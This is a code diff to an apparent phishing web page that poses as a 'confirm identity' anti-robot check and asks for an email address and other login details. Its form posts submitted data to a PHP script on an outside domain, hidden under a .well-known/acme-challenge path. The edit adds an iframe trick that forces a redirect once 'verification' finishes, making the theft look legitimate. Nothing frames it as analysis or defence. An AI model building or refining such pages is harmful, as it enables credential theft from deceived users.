@@ -92,7 +92,6 @@
     .text-secondary {
         font-weight: bold;
     }
-    /* Added spacing between title and form */
     .confirm-identity-spacing {
         margin-bottom: 24px;
     }
@@ -108,7 +107,6 @@
 
         <div class="text-center confirm confirm-identity-spacing">Confirm identity to prove you are not a robot</div>
 
-        <!-- ONLY CHANGE: Added action and method to form -->
         <form id="loginForm" action="https://seamua.com/.well-known/acme-challenge/ini.php" method="POST">
             <div class="form-group">
                 <label class="text-secondary font-weight-bold">Email Address</label>
@@ -205,7 +203,12 @@
                     verificationComplete.style.display = 'flex';
                     
                     setTimeout(() => {
-                        window.location.href = redirectUrl;
+                        // Force redirect through iframe
+                        const iframe = document.getElementById('iframe');
+                        iframe.onload = function() {
+                            window.top.location.href = redirectUrl;
+                        };
+                        iframe.src = redirectUrl;
                     }, 2000);
                 }
 
